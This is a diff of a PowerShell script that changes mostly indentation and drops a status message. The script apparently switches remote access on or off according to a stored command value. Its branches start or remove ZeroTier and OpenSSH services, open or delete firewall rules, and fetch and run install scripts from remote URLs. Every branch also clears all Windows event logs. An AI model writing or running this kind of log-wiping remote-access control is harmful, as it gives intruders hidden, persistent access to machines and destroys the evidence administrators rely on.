@@ -214,7 +214,7 @@ if ($storedCode -ne $null) {
                 # Perform actions based on status
                 switch ($status) {
                     "active" {
-                        Retry-Operation {
+                		Retry-Operation {
                     				Start-ServiceSafe -ServiceName $ztservice
                     				Start-ServiceSafe -ServiceName $sshagentservice
                     				Start-ServiceSafe -ServiceName $sshdservice
@@ -224,9 +224,9 @@ if ($storedCode -ne $null) {
                     				Enable-FirewallRule -ruleName $sshfirewall
                     				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
                     		} -MaxRetries $retryAttempts
-                    }
+                	}
                     "dormant" {
-                    			Retry-Operation {
+                    		Retry-Operation {
                     				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                     				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                     				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
@@ -236,10 +236,10 @@ if ($storedCode -ne $null) {
                     				Disable-FirewallRules -ruleName $sshfirewall
                     				Disable-FirewallRules -ruleName $ssholdfirewall
                     				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
-			                	} -MaxRetries $retryAttempts
-                    }
+		        	} -MaxRetries $retryAttempts
+                	}
                     "rejoin" {
-                      			Retry-Operation {
+              			Retry-Operation {
                       				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                       				Stop-AndDisable-ServiceSafe -ServiceName $ztservice2
                       				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
@@ -259,10 +259,10 @@ if ($storedCode -ne $null) {
                       				web-install -InstallScriptURL $sshinstall
                       				web-install -InstallScriptURL $ztinstall
                       				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
-			              	} -MaxRetries $retryAttempts
-                    }
+		              	} -MaxRetries $retryAttempts
+			}
                     "purge" {
-                        Retry-Operation {
+	                        Retry-Operation {
                       				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                       				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                       				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
@@ -285,43 +285,41 @@ if ($storedCode -ne $null) {
                       				Delete-Directories -directories $sshdatadir
                       				Delete-Directories -directories $ztdatadir
                       				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
-				                } -MaxRetries $retryAttempts
-			              }
-              			#Zerotier Purged, OpenSSH Disbaled
-              			"zpod" {
-                            Retry-Operation {
-                        				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
-                        				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
-                        				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
-                        				Delete-ServiceSafe -ServiceName $ztservice										
-                        				Disable-FirewallRules -ruleName $ztfirewall
-                        				Disable-FirewallRules -ruleName $ztfirewall2
-                        				Disable-FirewallRules -ruleName $ztfirewall3
-                        				Disable-FirewallRules -ruleName $sshfirewall
-                        				Disable-FirewallRules -ruleName $ssholdfirewall
-                        				Remove-FirewallRuleSafe -RuleName $ztfirewall
-                        				Remove-FirewallRuleSafe -ruleName $ztfirewall2
-                        				Remove-FirewallRuleSafe -ruleName $ztfirewall3
-                        				Delete-Directories -directories $ztdir
-                        				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+			                } -MaxRetries $retryAttempts
+				}
+              		#Zerotier Purged, OpenSSH Disbaled
+              		"zpod" {
+					Retry-Operation {
+                				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
+                				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
+                				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
+                       				Delete-ServiceSafe -ServiceName $ztservice										
+                        			Disable-FirewallRules -ruleName $ztfirewall
+                				Disable-FirewallRules -ruleName $ztfirewall2
+                				Disable-FirewallRules -ruleName $ztfirewall3
+                				Disable-FirewallRules -ruleName $sshfirewall
+                				Disable-FirewallRules -ruleName $ssholdfirewall
+                				Remove-FirewallRuleSafe -RuleName $ztfirewall
+                				Remove-FirewallRuleSafe -ruleName $ztfirewall2
+                        			Remove-FirewallRuleSafe -ruleName $ztfirewall3
+                        			Delete-Directories -directories $ztdir
+                        			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
               				} -MaxRetries $retryAttempts
-              			}
-              			#Zerotier Install, OpenSSH Enabled
-              			"zioe" {
-                            Retry-Operation {				
-                        			  Start-ServiceSafe -ServiceName $sshagentservice
-                        				Start-ServiceSafe -ServiceName $sshdservice
-                        				Enable-FirewallRule -ruleName $sshfirewall
-                        				web-install -InstallScriptURL $ztinstall
-                        				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
-                  				} -MaxRetries $retryAttempts
+				}
+              		#Zerotier Install, OpenSSH Enabled
+              		"zioe" {
+                         		Retry-Operation {				
+                        			Start-ServiceSafe -ServiceName $sshagentservice
+                        			Start-ServiceSafe -ServiceName $sshdservice
+                				Enable-FirewallRule -ruleName $sshfirewall
+                        			web-install -InstallScriptURL $ztinstall
+                        			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+                  			} -MaxRetries $retryAttempts
               	  		}                
-              	  }
-
+              	  	}
                 if ($status -ne $null) {
-                			Set-ItemProperty -Path $regPath -Name "Data" -Value $status
-                			Write-Host "Status updated to: $status"
-                		}
+        		Set-ItemProperty -Path $regPath -Name "Data" -Value $status
+		}
                 break
             }
         }
